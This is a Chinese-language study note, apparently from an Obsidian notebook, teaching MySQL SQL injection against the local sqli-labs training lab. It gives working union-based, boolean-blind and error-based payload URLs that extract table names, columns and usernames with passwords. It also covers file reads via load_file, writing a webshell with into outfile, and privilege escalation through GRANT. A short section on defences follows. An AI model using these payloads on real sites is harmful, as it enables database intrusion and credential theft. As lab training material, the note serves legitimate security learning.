sql injection级关系
    服务器
        多个数据库
            多个数据表
                多个行 列 字段
                    数据

系统库(低版本可能没有系统库)
    提供访问数据库元数据的方式
1. **information_schema库**：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；61张表
    - schemata——当前mysql实例中所有数据库的信息
    - tables——提供了关于数据中表的信息
    - columns——提供了表的列信息，详细描述了某张表的所有列以及每个列的信息，字段名
    - 例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。
3. **performance_schema库**具有87张表。 MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。
4. **mysql库**是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。 常用举例：在mysql.user表中修改root用户的密码
5. **sys库**具有1个表，100个视图。 sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。 可以查询谁使用了最多的资源，哪张表访问最多等。

# 手工注入
get提交——url提交 速度快
post提交——服务器提交 安全性 数据量
1. 判断有无注入点 and 1=1 true
    - 随便输入内容 == 报错 有注入点 == 不报错  没有注入点
2. 猜解列名字段数量 order by
- ![](图片/Pasted%20image%2020241018161806.png)
超了会报错
3. 根据报错，判断回显点 union select 字段数（1,2,3...）注意union前面的查询要没有
- ![](图片/Pasted%20image%2020241018162341.png)
4. 信息收集
    - version() database()
- ![](图片/Pasted%20image%2020241018163037.png)
5. 使用对应的SQL进行注入
    - union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
    - http://127.0.0.1/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,version(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27
    - ![](图片/Pasted%20image%2020241018164342.png)
    - union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'
    - http://127.0.0.1/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27
    - ![](图片/Pasted%20image%2020241018170114.png)
    - http://127.0.0.1/sqli-labs/Less-2/index.php?id=-1%20union%20select%201,2,(select%20group_concat(username,0x3a,password)from%20users)
    - union select 1,2,(select group_concat(username,0x3a,password)from users)
    - ![](图片/Pasted%20image%2020241018175747.png)
# 高权限注入
- 查询mysql的用户数
```
select user,host from mysql.user

mysql权限表的验证过程为：

	先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。

	通过身份认证后，进行权限分配，
	按照user，db，tables_priv，columns_priv的顺序进行验证。
	即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，
	将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，
	并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。
 
```
- ![](图片/Pasted%20image%2020241019161909.png)
- 查询用户对应权限
    - `select * from user where user='root' and host='localhost'`
    - ![](图片/Pasted%20image%2020241019162225.png)
> 系统权限表
```
User表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限 
	Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库 
	Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表 
	Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段 
	Procs_priv表：存放存储过程和函数级别的权限、
MySQl管理权限分为
    全局性的管理权限： 作用于整个MySQL实例级别 
	数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上 
	数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象
```
> 创建mysql用户
```
有两种方式创建MySQL授权用户

	执行create user/grant命令（推荐方式）
	CREATE USER 'finley'@'localhost' IDENTIFIED BY 'some_pass';
	通过insert语句直接操作MySQL系统权限表
```
> 只提供id查询权限
```
grant select(id) on test.temp to test1@'localhost' identified by '123456'
```
> 把普通用户变成管理员权限
```
GRANT ALL PRIVILEGES ON *.* TO 'test1'@'localhost' WITH GRANT OPTION
```
> 删除用户
 ```
drop user finley@'localhost'
```

- 查询数据库名
    - http://127.0.0.1/sqli-labs/Less-2/?id=-2%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata
![](图片/Pasted%20image%2020241025181234.png)
- 查询数据库对应的表名
    - http://localhost/sqli-labs/Less-2/?id=-2%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479   （security的16进制）
![](图片/Pasted%20image%2020241025182914.png)
- 查询表名对应的字段名
    - http://localhost/sqli-labs/Less-2/?id=-2%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x656d61696c73     （emails）
    - ![](图片/Pasted%20image%2020241025183406.png)
- 查询数据
    - http://localhost/sqli-labs/Less-2/?id=-2%20union%20select%201,group_concat(id),group_concat(email_id)%20from%20security.emails
    - ![](图片/Pasted%20image%2020241025183829.png)
# 文件读写
- 文件读写注入的原理
    - 就是利用文件的读写权限进行注入，它可以写入一句话木马，也可以读取系统文件的敏感信息。
- 文件读写注入的条件
    - 高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限
    - **secure_file_priv选项**
```
linux
cat  etc/conf

win
www/mysql / my.ini
```
- `show global variables like '%secure%' `查看mysql全局变量的配置
![](图片/Pasted%20image%2020241025223605.png)
- 读写文件需要 `secure_file_priv`权限
    - **`secure_file_priv=`**代表对文件读写没有限制
    - `secure_file_priv=NULL`代表不能进行文件读写
    - `secure_file_priv=d:/phpstudy/mysql/data`代表只能对该路径下文件进行读写
- 知道网站绝对路径
    - Windows常见：
    - ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/52b8185c15804b098e5832e56952f9d5.png)
    - Linux常见：
    - ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645161070000/c22c368cda784e5ebb911ff0bbd0fa99.png)
    - 路径获取常见方式：
        - 报错显示，遗留文件，漏洞报错，平台配置文件等
        - ![](图片/Pasted%20image%2020241026132849.png)
        - 
- http://localhost/sqli-labs/Less-2/?id=-2%20union%20select%201,2,load_file(%27/Users/boshanghanyancui/Desktop/01-web%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85/%E6%89%80%E6%9C%89%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%E5%9C%B0%E5%9D%80.txt%27)
- ![](图片/Pasted%20image%2020241025233447.png)
- 写入文件
    - 使用函数：`Into Outfile`（能写入多行，按格式输出）和 `into Dumpfile`（只能写入一行且没有输出格式）
    - outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径
# 基础防御
## 魔术引号

- 魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义。
- 魔术引号：
    - 在php.ini文件内找到
```
magic_quotes_gpc = on 开启
将其改为
magic_quotes_gpc = off 关闭
```
## 内置函数
- 做数据类型的过滤
- is_int()等
- addslashes()
- mysql_real_escape_string()
- mysql_escape_string()
## 自定义关键字
str_replace()
其他安全防护软件 WAF ......

# 注入数据类型
### 1）数字型注入点

许多网页链接有类似的结构 [http://xxx.com/users.php?id=1](http://xxx.com/users.php?id=1 "http://xxx.com/users.php?id=1") 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 `select * from 表名 where id=1` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where id=1 and 1=1`

### （2）字符型注入点

网页链接有类似的结构 [http://xxx.com/users.php?name=admin](http://xxx.com/users.php?name=admin "http://xxx.com/users.php?name=admin") 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 `select * from 表名 where name='admin'` 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where name='admin' and 1=1 '` 我们需要将这些烦人的引号给处理掉。

### （3）搜索型注入点

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 `"keyword=关键字"` 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：`select * from 表名 where 字段 like '%关键字%'` 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：`select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`

### (4) xx型注入点

其他型：也就是由于SQL语句拼接方式不同，在SQL中的实际语句为：，其本质为（xx') or 1=1 # ）

常见的闭合符号：' '' % ( { 

# Mysql常用函数
-------------------------------------  
**version()**:查询数据库的版本  
**user()**:查询数据库的使用者  
**database()**:数据库  
**system_user()**:系统用户名  
**session_user()**:连接数据库的用户名  
**current_user()**:当前用户名  
**load_file()**:读取本地文件  
**@@datadir**:读取数据库路径  
**@@basedir**:mysql安装路径  
**@@version_complie_os**:查看操作系统  

-------------------------------------

**ascii(str)**:返回给定字符的ascii值。如果str是空字符串，返回0如果str是NULL，返回NULL。如 ascii("a")=97  
**length(str)** : 返回给定字符串的长度，如 length("string")=6  
**substr(string,start,length)**:对于给定字符串string，从start位开始截取，截取length长度 ,如 substr("chinese",3,2)="in"  
**substr()、stbstring()、mid()** :三个函数的用法、功能均一致  
**concat(username)**：将查询到的username连在一起，默认用逗号分隔  
**concat(str1,'\*',str2)**：将字符串str1和str2的数据查询到一起，中间用\*连接  
**group_concat(username)** ：将username所有数据查询在一起，用逗号连接  
limit 0,1：查询第1个数 limit 1,1：查询第2个数

# 布尔盲注
例：less5
- ![](图片/Pasted%20image%2020241101100023.png)
- ![](图片/Pasted%20image%2020241101100109.png)
    - 正确显示
- ![](图片/Pasted%20image%2020241101102528.png)
    - 错误回显
## 猜解数据库名

^b4610c

- ![](图片/Pasted%20image%2020241101103034.png)
    - `http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())>7 --+`
    - `SELECT * FROM users WHERE id='1' and length(database())>7 -- ' LIMIT 0,1`
- ![](图片/Pasted%20image%2020241101103114.png)
    -  `http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())>8 --`
    - `SELECT * FROM users WHERE id='1' and length(database())>8 -- ' LIMIT 0,1`
- 可知数据库名大于7，不大于8------数据库名为8个字符
**继续猜解**
- `http://127.0.0.1/sqli-labs/Less-5/index.php?id=1' and ascii(mid(database(),1,1))>115--+`非正常
- `http://127.0.0.1/sqli-labs/Less-5/index.php?id=1' and ascii(mid(database(),1,1))>116--+ `非正常
- `http://127.0.0.1/sqli-labs/Less-5/index.php?id=1' and ascii(mid(database(),1,1))=115--+` 正常
- `http://127.0.0.1/sqli-labs/less-5/index.php?id=1' and ascii(mid(database(),2,1))=101--+` 正常 
- `http://127.0.0.1/sqli-labs/less-5/index.php?id=1' and ascii(mid(database(),3,1))=99--+ `正常
- 如此就得到了
    - 第一个字符的ASCII码为115解码出来为“s”
    - 第二个字符的ASCII码为101解码出来为“e”
    - 第二个字符的ASCII码为99解码出来为“c”
    - 依次类推出数据库的名字为“security”
- 同理判断数据表名以及字段名



# 报错方式相关
SQL 注入的报错注入（Error-Based SQL Injection）是一种通过诱使数据库返回错误信息来泄露数据的技术。报错注入利用了 SQL 函数和数据库返回的错误信息，让攻击者能够获取到数据库的结构或敏感数据。以下是常用的 SQL 报错注入方法总结：

### 1. 利用 `CONCAT` 函数的报错注入

通过 `CONCAT` 函数拼接数据，强制数据库返回错误信息。

**示例**：
```sql
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x7e, (SELECT version())) AS x FROM information_schema.tables GROUP BY x) t)--
```

- **解析**：`CONCAT` 拼接了当前数据库名和版本号。数据库尝试在 `GROUP BY` 中合并重复数据，因数据类型不匹配，产生错误并显示敏感信息。

### 2. 利用 `EXTRACTVALUE` 函数的报错注入（MySQL）

`EXTRACTVALUE` 是 MySQL 的 XML 处理函数，通常用于解析 XML。输入非 XML 数据会触发错误。

**示例**：
```sql
?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
```

- **解析**：`EXTRACTVALUE` 尝试解析 XML 路径，`CONCAT` 将当前数据库名插入其中。因为解析失败，数据库返回包含数据库名称的错误信息。

### 3. 利用 `UPDATEXML` 函数的报错注入（MySQL）

`UPDATEXML` 同样用于 XML 解析，在输入非 XML 数据时会报错。

**示例**：
```sql
?id=1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
```

- **解析**：`UPDATEXML` 试图更新 XML 数据，但由于 `user()` 的结果非 XML 格式，解析失败并返回数据库用户信息。

### 4. 使用 `CAST` 或 `CONVERT` 的类型转换报错

通过 `CAST` 或 `CONVERT` 函数强制转换数据类型，如果转换的数据格式不匹配，会引发错误。

**示例**：
```sql
?id=1' AND (SELECT 1 FROM (SELECT CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS SIGNED)) t)--
```

- **解析**：将表名 `table_name` 转换为整数（`SIGNED`），因为字符串不能转换为数值，引发错误并显示表名。

### 5. 使用 `GROUP BY` 或 `ORDER BY` 结合 `HAVING` 的报错注入

通过 `GROUP BY` 和 `HAVING` 子句的聚合函数引发错误，可以暴露数据。

**示例**：
```sql
?id=1' GROUP BY CONCAT((SELECT database()), 0x7e, FLOOR(RAND(0)*2)) HAVING COUNT(*)>1--
```

- **解析**：利用 `RAND(0)` 生成重复随机值，并将数据库名 `database()` 作为一部分进行 `GROUP BY` 操作。因为随机值重复导致聚合错误，错误消息中显示数据库名。

### 6. 使用 `TIMESTAMP` 类型转换的报错注入

通过将字符串强制转换为 `TIMESTAMP` 类型触发格式错误。

**示例**：
```sql
?id=1' AND (SELECT 1 FROM (SELECT TIMESTAMP((SELECT table_name FROM information_schema.tables LIMIT 1)) t)--
```

- **解析**：强制将表名转换为时间戳格式，导致格式不匹配的错误，错误信息中会包含表名。

---

### 防御措施

1. **使用参数化查询**：避免拼接用户输入的 SQL 查询，使用预编译的参数化查询。
2. **禁用错误显示**：在生产环境中关闭详细的 SQL 错误显示，防止敏感信息泄露。
3. **输入验证和过滤**：对输入进行类型验证，拒绝不符合预期的数据。
4. **最小化数据库用户权限**：确保应用用户的数据库权限最低，避免访问系统表如 `information_schema`。

通过适当的防护措施可以防止报错注入，从而保障数据库安全。



[[CTFsomething/SQL_PLUS]]